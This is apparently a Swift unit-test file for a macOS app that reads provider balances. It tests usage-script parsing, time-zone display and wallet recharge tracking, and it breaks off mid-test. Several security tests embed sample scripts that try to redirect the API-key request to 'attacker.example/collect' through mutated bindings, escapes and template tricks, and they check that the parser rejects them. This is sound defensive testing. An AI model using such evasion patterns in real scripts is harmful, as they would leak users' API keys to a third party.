        XCTAssertEqual(native?.nativeBalanceProvider?.endpoint, "https://api.deepseek.com/user/balance")
        XCTAssertEqual(native?.subscriptionPrefix, "/codex")
    }

    func testBalanceQueryReadsGrokbuildTOMLAPIKeyWithoutJSONAuth() throws {
        let grokbuildConfig = """
        [model."grok-4-fixture"]
        base_url = "https://tokenshop.example.test"
        api_key = "grokbuild-sanitized-key"
        """
        let settingsObject: [String: Any] = ["config": grokbuildConfig]
        let settingsText = String(
            data: try JSONSerialization.data(withJSONObject: settingsObject),
            encoding: .utf8
        )
        let metaObject: [String: Any] = [
            "usage_script": [
                "enabled": true,
                "autoQueryInterval": 30,
                "timeout": 15,
                "code": "fetch({ url: \"{{baseUrl}}/v1/usage\", headers: { Authorization: \"Bearer {{apiKey}}\" } })"
            ]
        ]
        let metaText = String(
            data: try JSONSerialization.data(withJSONObject: metaObject),
            encoding: .utf8
        )

        var failure: BalanceQueryFailure?
        let query = BalanceQuery.make(
            settingsText: try XCTUnwrap(settingsText),
            metaText: try XCTUnwrap(metaText),
            websiteText: nil,
            appType: "grokbuild",
            onFailure: { failure = $0 }
        )

        XCTAssertNil(failure)
        XCTAssertEqual(query?.apiKey, "grokbuild-sanitized-key")
        XCTAssertEqual(query?.url, "https://tokenshop.example.test/v1/usage")
        XCTAssertEqual(query?.websiteURL, URL(string: "https://tokenshop.example.test"))
    }

    func testBalanceQueryPrefersExperimentalBearerTokenOverTOMLAPIKey() throws {
        let config = """
        [experimental]
        experimental_bearer_token = "tokenshop-sanitized-bearer"
        api_key = "grokbuild-sanitized-key"
        base_url = "https://tokenshop.example.test"
        """
        let settingsText = String(
            data: try JSONSerialization.data(withJSONObject: ["config": config]),
            encoding: .utf8
        )
        let metaText = #"{"usage_script":{"enabled":true,"code":"fetch({ url: \"{{baseUrl}}/v1/usage\" })"}}"#
        let query = BalanceQuery.make(
            settingsText: try XCTUnwrap(settingsText),
            metaText: metaText,
            websiteText: nil,
            appType: "codex"
        )

        XCTAssertEqual(query?.apiKey, "tokenshop-sanitized-bearer")
    }

    func testBalanceQueryIgnoresCommentedTOMLAPIKey() throws {
        var failure: BalanceQueryFailure?
        let config = """
        [model."grok-4-fixture"]
        base_url = "https://tokenshop.example.test"
        # api_key = "commented-key"
        """
        let settingsText = String(
            data: try JSONSerialization.data(withJSONObject: ["config": config]),
            encoding: .utf8
        )
        let query = BalanceQuery.make(
            settingsText: try XCTUnwrap(settingsText),
            metaText: #"{"usage_script":{"enabled":true,"code":"fetch({ url: \"{{baseUrl}}/v1/usage\" })"}}"#,
            websiteText: nil,
            appType: "grokbuild",
            onFailure: { failure = $0 }
        )
        XCTAssertNil(query)
        XCTAssertEqual(failure, .credentialMissing)
    }

    func testBalanceQueryParsesCCSwitchGenericTemplate() throws {
        // Issue #484: CC Switch generic template for third-party providers
        let ccswitchCode = """
        ({
          request: {
            url: "{{baseUrl}}/user/balance",
            method: "GET",
            headers: {
              "Authorization": "Bearer {{apiKey}}",
              "User-Agent": "cc-switch/1.0"
            }
          },
          extractor: function(response) {
            return {
              isValid: response.is_active || true,
              remaining: response.balance,
              unit: "USD"
            };
          }
        })
        """
        let metaObject: [String: Any] = [
            "usage_script": [
                "enabled": true,
                "code": ccswitchCode,
                "autoQueryInterval": 30,
                "timeout": 15
            ]
        ]
        let metaText = String(
            data: try JSONSerialization.data(withJSONObject: metaObject),
            encoding: .utf8
        )
        let settingsText = #"{"apiKey":"test-key","baseUrl":"https://api.huanling.example"}"#

        var failure: BalanceQueryFailure?
        let query = BalanceQuery.make(
            settingsText: settingsText,
            metaText: try XCTUnwrap(metaText),
            websiteText: nil,
            appType: "claude",
            onFailure: { failure = $0 }
        )

        XCTAssertNil(failure, "Should not fail with: \(failure?.diagnostic ?? "none")")
        XCTAssertEqual(query?.url, "https://api.huanling.example/user/balance")
        XCTAssertEqual(query?.apiKey, "test-key")
        XCTAssertEqual(query?.intervalMinutes, 30)
        XCTAssertEqual(query?.timeoutSeconds, 15)
    }

    func testBalanceQueryHandlesQuotedKeyVariations() throws {
        let variations: [(String, String)] = [
            (#""url": "{{baseUrl}}/balance""#, "double-quoted key and value"),
            (#"'url': '{{baseUrl}}/balance'"#, "single-quoted key and value"),
            (#""url": '{{baseUrl}}/balance'"#, "double-quoted key, single-quoted value"),
            (#"'url': "{{baseUrl}}/balance""#, "single-quoted key, double-quoted value"),
            ("url: `{{baseUrl}}/balance`", "unquoted key, backtick value"),
        ]

        for (urlSnippet, description) in variations {
            let code = "({ request: { \(urlSnippet) } })"
            let metaObject: [String: Any] = [
                "usage_script": [
                    "enabled": true,
                    "code": code
                ]
            ]
            let metaText = String(
                data: try JSONSerialization.data(withJSONObject: metaObject),
                encoding: .utf8
            )
            let settingsText = #"{"apiKey":"test-key","baseUrl":"https://api.example.test"}"#

            var failure: BalanceQueryFailure?
            let query = BalanceQuery.make(
                settingsText: settingsText,
                metaText: try XCTUnwrap(metaText),
                websiteText: nil,
                appType: "claude",
                onFailure: { failure = $0 }
            )

            XCTAssertNil(failure, "[\(description)] Should not fail")
            XCTAssertEqual(
                query?.url,
                "https://api.example.test/balance",
                "[\(description)] URL should be correctly extracted and substituted"
            )
        }
    }

    func testBalanceQueryHandlesWhitespaceVariations() throws {
        let variations = [
            #"url:"{{baseUrl}}/balance""#,
            #"url :"{{baseUrl}}/balance""#,
            #"url: "{{baseUrl}}/balance""#,
            #"url : "{{baseUrl}}/balance""#,
            #"url  :  "{{baseUrl}}/balance""#,
        ]

        for urlSnippet in variations {
            let code = "({ request: { \(urlSnippet) } })"
            let metaObject: [String: Any] = [
                "usage_script": [
                    "enabled": true,
                    "code": code
                ]
            ]
            let metaText = String(
                data: try JSONSerialization.data(withJSONObject: metaObject),
                encoding: .utf8
            )
            let settingsText = #"{"apiKey":"test-key","baseUrl":"https://api.example.test"}"#

            let query = BalanceQuery.make(
                settingsText: settingsText,
                metaText: try XCTUnwrap(metaText),
                websiteText: nil,
                appType: "claude"
            )

            XCTAssertEqual(
                query?.url,
                "https://api.example.test/balance",
                "Whitespace variation [\(urlSnippet)] should work"
            )
        }
    }

    func testBalanceQueryEvaluatesComputedURLFromIIFEScript() throws {
        let code = """
        ({
            request: (() => {
              const base = "{{baseUrl}}".replace(/\\/+$/, "").replace(/\\/v1$/i, "");
              return {
                url: base + "/v1/usage",
                method: "GET",
                headers: { "Authorization": "Bearer {{apiKey}}" }
              };
            })(),
            extractor: function(response) {
              return { isValid: true, remaining: response?.remaining, unit: "USD" };
            }
          })
        """
        let metaObject: [String: Any] = [
            "usage_script": ["enabled": true, "code": code, "templateType": ""]
        ]
        let metaText = String(
            data: try JSONSerialization.data(withJSONObject: metaObject),
            encoding: .utf8
        )
        let settingsText = #"{"env":{"ANTHROPIC_AUTH_TOKEN":"test-key","ANTHROPIC_BASE_URL":"https://api.example.test/v1/"}}"#

        let query = BalanceQuery.make(
            settingsText: settingsText,
            metaText: try XCTUnwrap(metaText),
            websiteText: nil,
            appType: "claude"
        )

        XCTAssertEqual(query?.url, "https://api.example.test/v1/usage")
        XCTAssertEqual(query?.apiKey, "test-key")
    }

    func testBalanceQueryRejectsUnevaluableURLInsteadOfSendingKeyToTruncatedURL() throws {
        let code = """
        const docs = { url: "https://docs.example.com" };
        ({ request: { url: "{{baseUrl}}/api/user/self?id=" + userId } })
        """
        let metaText = String(
            data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]),
            encoding: .utf8
        )

        var failure: BalanceQueryFailure?
        let query = BalanceQuery.make(
            settingsText: #"{"apiKey":"test-key","baseUrl":"https://api.example.test"}"#,
            metaText: try XCTUnwrap(metaText),
            websiteText: nil,
            appType: "claude",
            onFailure: { failure = $0 }
        )

        XCTAssertNil(query)
        XCTAssertEqual(failure, .requestEndpointMissing)
    }

    func testBalanceQueryRejectsNestedRequestOutsideFinalConfig() throws {
        let code = """
        const metadata = {
          request: { url: "https://attacker.example/collect" }
        };
        ({
          extractor: function(response) { return response; }
        })
        """
        let metaText = String(
            data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]),
            encoding: .utf8
        )
        var failure: BalanceQueryFailure?
        let query = BalanceQuery.make(
            settingsText: #"{"apiKey":"test-key","baseUrl":"https://api.example.test"}"#,
            metaText: try XCTUnwrap(metaText),
            websiteText: nil,
            appType: "claude",
            onFailure: { failure = $0 }
        )
        XCTAssertNil(query)
        XCTAssertEqual(failure, .requestEndpointMissing)
    }

    func testBalanceQueryRejectsMutatedBindingsAndUnsupportedEscapes() throws {
        let codes = [
            #"const req = { url: 'https://attacker.example/collect' }; req.url = '{{baseUrl}}/usage'; ({ request: req })"#,
            #"const req = { url: 'https://attacker.example/collect' } && { url: '{{baseUrl}}/usage' }; ({ request: req })"#,
            #"({ request: { url: 'https://\x61pi-vendor.com/usage' } })"#,
            #"({ request: { url: `https://\u0061pi-vendor.com/usage` } })"#,
            #"({ request: { url: 'https://api.example/v1'.replaceAll(/v1/, 'usage') } })"#
        ]
        for code in codes {
            let metaText = String(data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]), encoding: .utf8)
            var failure: BalanceQueryFailure?
            let query = BalanceQuery.make(
                settingsText: #"{"apiKey":"test-key","baseUrl":"https://api-vendor.com"}"#,
                metaText: try XCTUnwrap(metaText), websiteText: nil, appType: "claude",
                onFailure: { failure = $0 }
            )
            XCTAssertNil(query, code)
            XCTAssertEqual(failure, .requestEndpointMissing, code)
        }
    }

    func testBalanceQueryRejectsTemplateMutationAndUnterminatedComment() throws {
        let codes = [
            """
            let base = "https://attacker.example/collect";
            const note = `${base = "{{baseUrl}}/usage"}`;
            ({ request: { url: base } })
            """,
            """
            ({ request: { url: "https://attacker.example/collect" } }) /*
            """
        ]
        for code in codes {
            let metaText = String(data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]), encoding: .utf8)
            var failure: BalanceQueryFailure?
            let query = BalanceQuery.make(settingsText: #"{"apiKey":"test-key","baseUrl":"https://provider.example"}"#, metaText: try XCTUnwrap(metaText), websiteText: nil, appType: "claude", onFailure: { failure = $0 })
            XCTAssertNil(query)
            XCTAssertEqual(failure, .requestEndpointMissing)
        }
    }

    private func makeDefaults() -> (UserDefaults, String) {
        let suiteName = "BalanceBarTests.ProviderBalanceProgress.\(UUID().uuidString)"
        let defaults = UserDefaults(suiteName: suiteName)!
        defaults.removePersistentDomain(forName: suiteName)
        return (defaults, suiteName)
    }

    private func expectedResetDateText(
        _ date: Date,
        template: String,
        calendar: Calendar,
        locale: Locale,
        timeZone: TimeZone
    ) -> String {
        var localizedCalendar = calendar
        localizedCalendar.locale = locale
        localizedCalendar.timeZone = timeZone
        let formatter = DateFormatter()
        formatter.locale = locale
        formatter.calendar = localizedCalendar
        formatter.timeZone = timeZone
        formatter.setLocalizedDateFormatFromTemplate(template)
        return formatter.string(from: date)
    }

    private func makeBalanceProgressQuery(
        url: String = "https://provider.example/usage",
        apiKey: String = "test-token"
    ) -> BalanceQuery {
        BalanceQuery(
            url: url,
            websiteURL: URL(string: "https://provider.example"),
            apiKey: apiKey,
            intervalMinutes: 1,
            timeoutSeconds: 10,
            isRightCode: false,
            subscriptionPrefix: "/codex",
            nativeBalanceProvider: nil,
            isNewAPI: false,
            additionalHeaders: [:]
        )
    }

    private func progress(
        _ store: ProviderBalanceProgressStore,
        amount: Double,
        unit: String,
        identity: ProviderBalanceProgressIdentity
    ) throws -> Double {
        guard case .success(let value) = store.update(
            amount: amount,
            unit: unit,
            identity: identity
        ) else {
            throw NSError(domain: "BalanceBarTests.ProviderBalanceProgress", code: 1)
        }
        return value
    }
}

extension DomainModelsTests {
    func testDisplayTimeZoneChangesLocalDayAndTooltipWithoutChangingCountdown() throws {
        let parser = ISO8601DateFormatter()
        let now = try XCTUnwrap(parser.date(from: "2026-01-01T18:00:00Z"))
        let reset = try XCTUnwrap(parser.date(from: "2026-01-01T23:30:00Z"))
        let utc = AppTimeZoneSelection.fixedOffset(minutes: 0).resolved()
        let nepal = AppTimeZoneSelection.fixedOffset(minutes: 345).resolved()
        let locale = Locale(identifier: "en_GB")
        let calendar = Calendar(identifier: .gregorian)
        let utcText = try XCTUnwrap(OfficialQuotaResetFormatter.string(for: reset, relativeTo: now, calendar: calendar, locale: locale, timeZone: utc))
        let localText = try XCTUnwrap(OfficialQuotaResetFormatter.string(for: reset, relativeTo: now, calendar: calendar, locale: locale, timeZone: nepal))
        XCTAssertTrue(utcText.contains("23:30"))
        XCTAssertTrue(localText.contains("05:15"))
        XCTAssertFalse(AppDisplayTime.calendar(timeZone: nepal).isDate(now, inSameDayAs: reset))
        XCTAssertTrue(AppDisplayTime.calendar(timeZone: utc).isDate(now, inSameDayAs: reset))
        let forecast = CodexResetForecast(probability24h: .unavailable, probability48h: .unavailable, confidence: .unavailable, updatedAt: reset, isCached: false, officialSignal: .init(probability: .unavailable, targetAt: reset))
        let remaining = forecast.remainingCountdownSeconds(now: now)
        let tooltipUTC = StatusItemController.codexResetForecastTooltip(for: forecast, language: .english, now: now, timeZone: utc)
        let tooltipLocal = StatusItemController.codexResetForecastTooltip(for: forecast, language: .english, now: now, timeZone: nepal)
        XCTAssertNotEqual(tooltipUTC.source, tooltipLocal.source)
        XCTAssertEqual(forecast.remainingCountdownSeconds(now: now), remaining)
        XCTAssertEqual(remaining, 19800)
        XCTAssertEqual(forecast.officialSignal?.targetAt, reset)
    }
}

extension DomainModelsTests {
    func testExpiredBankedResetUsesSelectedZoneAndExpiredLabel() throws {
        let now = Date(timeIntervalSince1970: 1_780_000_000)
        let expired = now.addingTimeInterval(-3600)
        let locale = Locale(identifier: "en_US")
        let tokyo = try XCTUnwrap(TimeZone(identifier: "Asia/Tokyo"))
        let la = try XCTUnwrap(TimeZone(identifier: "America/Los_Angeles"))
        let stamp = try XCTUnwrap(OfficialQuotaResetFormatter.bankedResetString(for: expired, relativeTo: now, locale: locale, timeZone: tokyo, includeExpired: true))
        let text = try XCTUnwrap(CodexBankedResetFormatting.expiryText(for: expired, relativeTo: now, locale: locale, timeZone: tokyo))
        XCTAssertEqual(text, tr(.keyCodexBankedResetExpiredValue, arguments: [stamp]))
        XCTAssertNotEqual(text, CodexBankedResetFormatting.expiryText(for: expired, relativeTo: now, locale: locale, timeZone: la))
        XCTAssertNil(OfficialQuotaResetFormatter.bankedResetString(for: expired, relativeTo: now))
        XCTAssertNil(CodexBankedResetFormatting.remaining(until: expired, now: now))
        XCTAssertNil(CodexBankedResetFormatting.expiryText(for: nil, relativeTo: now))
    }
}


extension DomainModelsTests {
    func testWalletRechargeIsSharedPersistentAndRejectsOutOfOrderSamples() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let query = makeBalanceProgressQuery()
        let a = ProviderBalanceProgressIdentity(client: .claude, providerID: "gpt", query: query)
        let b = ProviderBalanceProgressIdentity(client: .claude, providerID: "grok", query: query)
        XCTAssertEqual(a.walletID, b.walletID)
        let store = ProviderBalanceProgressStore(defaults: defaults)
        let start = Date(timeIntervalSince1970: 1_700_000_000)
        func sample(_ amount: Double, _ identity: ProviderBalanceProgressIdentity, order: UInt64? = nil, date: Date? = nil) throws -> ProviderBalanceProgressStore.Observation {
            try store.observe(amount: amount, unit: "USD", identity: identity,
                sampleSequence: order ?? store.beginSample(), observedAt: date ?? start).get()
        }
        XCTAssertNil(try sample(3, a).recharge)
        let older = store.beginSample()
        let latest = store.beginSample()
        XCTAssertEqual(try sample(2, b, order: latest).amount, 2)
        let stale = try sample(13, a, order: older)
        XCTAssertFalse(stale.accepted)
        XCTAssertEqual(stale.amount, 2)
        XCTAssertNil(stale.recharge)
        let charged = try sample(12, a)
        XCTAssertEqual(charged.recharge?.amountCents, 1000)
        XCTAssertEqual(charged.recharge?.observedAt, start)
        XCTAssertEqual(charged.progress, 100)
        let later = start.addingTimeInterval(60)
        XCTAssertEqual(try sample(12, b, date: later).recharge?.observedAt, start)
        XCTAssertEqual(try sample(3.73, b).progress, 3.73 / 12 * 100, accuracy: 0.00001)
        XCTAssertEqual(try sample(3.73, a).recharge?.amountCents, 1000)
        let restored = ProviderBalanceProgressStore(defaults: defaults)
        let value = try restored.observe(amount: 3, unit: "USD", identity: a,
            sampleSequence: restored.beginSample(), observedAt: later).get()
        XCTAssertEqual(value.recharge, charged.recharge)
        XCTAssertEqual(value.progress, 25)
        let next = try sample(4.73, a)
        XCTAssertEqual(next.recharge?.amountCents, 100)
        XCTAssertEqual(next.progress, 100)
        let otherCurrency = try store.observe(amount: 7, unit: "CNY", identity: a,
            sampleSequence: store.beginSample(), observedAt: start).get()
        XCTAssertNil(otherCurrency.recharge)
    }

    func testWalletMigrationOnlyAdoptsAgreeingLegacyRecordsAndRebasesMissingDate() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let query = makeBalanceProgressQuery()
        let a = ProviderBalanceProgressIdentity(client: .codex, providerID: "a", query: query)
        let b = ProviderBalanceProgressIdentity(client: .codex, providerID: "b", query: query)
        func seed(_ second: Int) throws {
            let state: [String: Any] = ["baselineCents": 1000, "lastCents": 300, "unit": "USD"]
            var other = state; other["lastCents"] = second
            defaults.set(try JSONSerialization.data(withJSONObject: [a.storageKey: state, b.storageKey: other]),
                forKey: ProviderBalanceProgressStore.storageKey)
        }
        try seed(300)
        let store = ProviderBalanceProgressStore(defaults: defaults)
        store.prepareMigration(identities: [a, b])
        let value = try store.observe(amount: 3, unit: "USD", identity: a,
            sampleSequence: store.beginSample(), observedAt: Date()).get()
        XCTAssertEqual(value.progress, 100)
        XCTAssertNil(value.recharge)
        try seed(400)
        let conflict = ProviderBalanceProgressStore(defaults: defaults)
        conflict.prepareMigration(identities: [a, b])
        let initial = try conflict.observe(amount: 5, unit: "USD", identity: a,
            sampleSequence: conflict.beginSample(), observedAt: Date()).get()
        XCTAssertEqual(initial.progress, 100)
        XCTAssertNil(initial.recharge)
    }

    func testWalletIdentityIncludesAuthenticationAndParsingButNotPresentation() {
        let base = makeBalanceProgressQuery()
        func changed(key: String? = nil, headers: [String: String]? = nil, prefix: String? = nil, endpoint: String? = nil) -> BalanceQuery {
            BalanceQuery(url: endpoint ?? base.url, websiteURL: URL(string: "https://renamed.example"),
                apiKey: key ?? base.apiKey, intervalMinutes: 99, timeoutSeconds: 99,
                isRightCode: base.isRightCode, subscriptionPrefix: prefix ?? base.subscriptionPrefix,
                nativeBalanceProvider: base.nativeBalanceProvider, isNewAPI: base.isNewAPI,
                additionalHeaders: headers ?? base.additionalHeaders)
        }
        let a = ProviderBalanceProgressIdentity(client: .codex, providerID: "a", query: base).walletID
        XCTAssertEqual(a, ProviderBalanceProgressIdentity(client: .codex, providerID: "b", query: changed()).walletID)
        for query in [changed(key: "other"), changed(headers: ["Account": "other"]), changed(prefix: "/other"), changed(endpoint: "https://other.example")] {
            XCTAssertNotEqual(a, ProviderBalanceProgressIdentity(client: .codex, providerID: "a", query: query).walletID)
        }
    }

    func testRechargeDateUsesDisplayTimeZoneAndYearWithoutInventingPaymentTime() throws {
        let parse = ISO8601DateFormatter()
        let now = try XCTUnwrap(parse.date(from: "2026-10-14T04:00:00Z"))
        func text(_ iso: String, _ zone: String = "UTC") throws -> String {
            BalanceRecharge(amountCents: 1000, observedAt: try XCTUnwrap(parse.date(from: iso)))
                .dateText(now: now, timeZone: try XCTUnwrap(TimeZone(identifier: zone)))
        }
        XCTAssertEqual(try text("2026-10-14T00:30:00Z"), "10/14")
        XCTAssertEqual(try text("2026-10-02T14:30:00Z"), "10/02")
        XCTAssertEqual(try text("2025-12-28T14:30:00Z"), "2025/12/28")
        XCTAssertEqual(try text("2026-10-14T00:30:00Z", "America/Los_Angeles"), "10/13")
    }
}


extension DomainModelsTests {
    func testCodexAccountsStayIndependentAcrossSameNamesKeysAndRename() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let query = makeBalanceProgressQuery()
        let a = ProviderBalanceProgressIdentity(client: .codex, providerID: "a", query: query, providerName: "same")
        let b = ProviderBalanceProgressIdentity(client: .codex, providerID: "b", query: query, providerName: "same")
        let renamed = ProviderBalanceProgressIdentity(client: .codex, providerID: "a", query: query, providerName: "renamed")
        let rekeyed = ProviderBalanceProgressIdentity(client: .codex, providerID: "a",
            query: makeBalanceProgressQuery(apiKey: "new-account"), providerName: "same")
        XCTAssertNotEqual(a.accountingID, b.accountingID)
        XCTAssertNotEqual(a.accountingID, rekeyed.accountingID)
        XCTAssertEqual(a.accountingID, renamed.accountingID)
        let store = ProviderBalanceProgressStore(defaults: defaults)
        func sample(_ amount: Double, _ id: ProviderBalanceProgressIdentity, _ order: UInt64? = nil) throws -> ProviderBalanceProgressStore.Observation {
            try store.observe(amount: amount, unit: "USD", identity: id,
                sampleSequence: order ?? store.beginSample(), observedAt: Date(timeIntervalSince1970: 100)).get()
        }
        XCTAssertNil(try sample(3, a).recharge)
        let old = store.beginSample()
        XCTAssertNil(try sample(13, b).recharge)
        XCTAssertEqual(try sample(13, a).recharge?.amountCents, 1000)
        let rejected = try sample(20, a, old)
        XCTAssertFalse(rejected.accepted)
        XCTAssertEqual(rejected.amount, 13)
        XCTAssertEqual(try sample(12, renamed).recharge?.amountCents, 1000)
        XCTAssertNil(try sample(100, rekeyed).recharge)
        let restart = ProviderBalanceProgressStore(defaults: defaults)
        XCTAssertNil(try restart.observe(amount: 12, unit: "USD", identity: b,
            sampleSequence: restart.beginSample(), observedAt: Date()).get().recharge)
    }

    func testProviderOwnedHistorySurvivesRenameAndNeverCombinesPeers() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let query = makeBalanceProgressQuery()
        let other = makeBalanceProgressQuery(url: "https://other.example/usage", apiKey: "other")
        let oldA = ProviderBalanceProgressIdentity(client: .codex, providerID: "a", query: query)
        let oldB = ProviderBalanceProgressIdentity(client: .codex, providerID: "b", query: other)
        let a = ProviderBalanceProgressIdentity(client: .codex, providerID: "a", query: query, providerName: "same")
        let b = ProviderBalanceProgressIdentity(client: .codex, providerID: "b", query: other, providerName: "same")
        func seed(second: Double) {
            defaults.removePersistentDomain(forName: suiteName)
            let old = ProviderBalanceProgressStore(defaults: defaults)
            _ = old.update(amount: 10, unit: "USD", identity: oldA)
            _ = old.update(amount: 10, unit: "USD", identity: oldB)
            _ = old.update(amount: 3, unit: "USD", identity: oldA)
            _ = old.update(amount: second, unit: "USD", identity: oldB)
        }
        func sample(_ store: ProviderBalanceProgressStore, _ id: ProviderBalanceProgressIdentity, _ amount: Double) throws -> ProviderBalanceProgressStore.Observation {
            try store.observe(amount: amount, unit: "USD", identity: id,
                sampleSequence: store.beginSample(), observedAt: Date()).get()
        }
        seed(second: 3)
        let store = ProviderBalanceProgressStore(defaults: defaults)
        store.prepareMigration(identities: [a, b])
        let migrated = try sample(store, a, 3)
        XCTAssertEqual(migrated.progress, 30)
        XCTAssertNil(migrated.recharge)
        let renamed = ProviderBalanceProgressIdentity(client: .codex, providerID: "a", query: query, providerName: "renamed")
        let restart = ProviderBalanceProgressStore(defaults: defaults)
        restart.prepareMigration(identities: [renamed, b])
        XCTAssertEqual(try sample(restart, renamed, 13).recharge?.amountCents, 1000, "renaming does not change account ownership")
        seed(second: 4)
        let conflict = ProviderBalanceProgressStore(defaults: defaults)
        conflict.prepareMigration(identities: [a, b])
        let initial = try sample(conflict, b, 13)
        XCTAssertEqual(initial.recharge?.amountCents, 900)
        XCTAssertEqual(initial.progress, 100)
    }
}


extension DomainModelsTests {
    func testNameMigrationPreservesAgreeingRechargeAndCurrencyWithoutFabricatingEvents() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let query = makeBalanceProgressQuery()
        let other = makeBalanceProgressQuery(url: "https://peer.example/usage", apiKey: "peer")
        let queries = [query, other]
        let old = ProviderBalanceProgressStore(defaults: defaults)
        let date = Date(timeIntervalSince1970: 100)
        for (index, query) in queries.enumerated() {
            let id = ProviderBalanceProgressIdentity(client: .codex, providerID: "p\(index)", query: query)
            for amount in [3.0, 13.0] {
                _ = try old.observe(amount: amount, unit: "USD", identity: id,
                    sampleSequence: old.beginSample(), observedAt: date).get()
            }
        }
        let peers = queries.enumerated().map { ProviderBalanceProgressIdentity(client: .codex,
            providerID: "p\($0.offset)", query: $0.element, providerName: "same") }
        let store = ProviderBalanceProgressStore(defaults: defaults)
        store.prepareMigration(identities: peers)
        let value = try store.observe(amount: 3.73, unit: "USD", identity: peers[0],
            sampleSequence: store.beginSample(), observedAt: date.addingTimeInterval(60)).get()
        XCTAssertEqual(value.recharge, BalanceRecharge(amountCents: 1000, observedAt: date))
        XCTAssertEqual(value.progress, 3.73 / 13 * 100, accuracy: 0.00001)
        let cny = try store.observe(amount: 100, unit: "CNY", identity: peers[1],
            sampleSequence: store.beginSample(), observedAt: date).get()
        XCTAssertNil(cny.recharge)
        XCTAssertEqual(cny.progress, 100)
        let restarted = ProviderBalanceProgressStore(defaults: defaults)
        restarted.prepareMigration(identities: peers)
        let persistent = try restarted.observe(amount: 3, unit: "USD", identity: peers[1],
            sampleSequence: restarted.beginSample(), observedAt: date).get()
        XCTAssertEqual(persistent.recharge, value.recharge)
    }
}


extension DomainModelsTests {
    func testRechargeProgressUsesPostIncreasePeakAndPersistsOptionalBaselineTime() throws {
        let (defaults, suite) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suite) }
        let id = ProviderBalanceProgressIdentity(client: .codex, providerID: "peak", query: makeBalanceProgressQuery())
        let firstDate = Date(timeIntervalSince1970: 1_700_000_000)
        let rechargeDate = firstDate.addingTimeInterval(60)
        let store = ProviderBalanceProgressStore(defaults: defaults)
        func observe(_ amount: Double, _ date: Date) throws -> ProviderBalanceProgressStore.Observation {
            try store.observe(amount: amount, unit: "USD", identity: id,
                sampleSequence: store.beginSample(), observedAt: date).get()
        }
        XCTAssertEqual(try observe(3, firstDate).displayProgress, 100)
        let increased = try observe(13, rechargeDate)
        XCTAssertEqual(increased.recharge?.amountCents, 1000)
        XCTAssertEqual(increased.displayProgress, 100)
        let spent = try observe(12, rechargeDate.addingTimeInterval(60))
        XCTAssertEqual(try XCTUnwrap(spent.displayProgress), 12 / 13 * 100, accuracy: 0.000001)
        XCTAssertEqual(spent.recharge, increased.recharge)
        let data = try XCTUnwrap(defaults.data(forKey: ProviderBalanceProgressStore.storageKey))
        let records = try XCTUnwrap(JSONSerialization.jsonObject(with: data) as? [String: [String: Any]])
        let state = try XCTUnwrap(records.values.first)
        XCTAssertEqual(state["peakCents"] as? Int, 1300)
        XCTAssertNotNil(state["baselineObservedAt"])
        let restarted = ProviderBalanceProgressStore(defaults: defaults)
        let afterRestart = try restarted.observe(amount: 11, unit: "USD", identity: id,
            sampleSequence: restarted.beginSample(), observedAt: rechargeDate.addingTimeInterval(120)).get()
        XCTAssertEqual(afterRestart.progress, 11 / 13 * 100, accuracy: 0.000001)
        XCTAssertEqual(afterRestart.recharge?.observedAt, rechargeDate)
    }

    func testLegacyPeakMigrationRebasesMissingBaselineDateAndPreservesRecharge() throws {
        let (defaults, suite) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suite) }
        let id = ProviderBalanceProgressIdentity(client: .codex, providerID: "legacy-peak", query: makeBalanceProgressQuery())
        let key = "wallet:" + id.accountingID + ":USD"
        let old: [String: Any] = ["baselineCents": 1300, "lastCents": 1200, "unit": "USD",
            "recharge": ["amountCents": 1000, "observedAt": 10.0], "sampleSequence": 7]
        defaults.set(try JSONSerialization.data(withJSONObject: [key: old]), forKey: ProviderBalanceProgressStore.storageKey)
        let store = ProviderBalanceProgressStore(defaults: defaults)
        let observation = try store.observe(amount: 11, unit: "USD", identity: id,
            sampleSequence: store.beginSample(), observedAt: Date()).get()
        XCTAssertEqual(observation.progress, 100, accuracy: 0.000001)
        XCTAssertEqual(observation.recharge?.observedAt, Date(timeIntervalSinceReferenceDate: 10))
        XCTAssertEqual(observation.progressContext.baselineObservedAt, observation.observedAt)
        let records = try XCTUnwrap(JSONSerialization.jsonObject(with: XCTUnwrap(defaults.data(forKey: ProviderBalanceProgressStore.storageKey))) as? [String: [String: Any]])
        XCTAssertEqual(records[key]?["peakCents"] as? Int, 1100)
        XCTAssertNotNil(records[key]?["baselineObservedAt"])
    }
}

extension DomainModelsTests {
    func testRechargeSurvivesOldSchemaRoundTripAndCodexNameMigration() throws {
        let (defaults, suite) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suite) }
        let query = makeBalanceProgressQuery()
        let legacy = ProviderBalanceProgressIdentity(client: .codex, providerID: "deepseek-fixture", query: query)
        let original = ProviderBalanceProgressStore(defaults: defaults)
        let time = Date(timeIntervalSince1970: 1_700_000_000)
        for amount in [3.0, 3.22] {
            _ = try original.observe(amount: amount, unit: "CNY", identity: legacy,
                sampleSequence: original.beginSample(), observedAt: time).get()
        }
        let data = try XCTUnwrap(defaults.data(forKey: ProviderBalanceProgressStore.storageKey))
        var records = try XCTUnwrap(JSONSerialization.jsonObject(with: data) as? [String: [String: Any]])
        for key in records.keys {
            records[key]?.removeValue(forKey: "peakCents")
            records[key]?.removeValue(forKey: "baselineObservedAt")
        }
        defaults.set(try JSONSerialization.data(withJSONObject: records), forKey: ProviderBalanceProgressStore.storageKey)
        let named = ProviderBalanceProgressIdentity(client: .codex, providerID: "deepseek-fixture", query: query, providerName: "DeepSeek fixture")
        let upgraded = ProviderBalanceProgressStore(defaults: defaults)
        upgraded.prepareMigration(identities: [named])
        let observed = try upgraded.observe(amount: 3.20, unit: "CNY", identity: named,
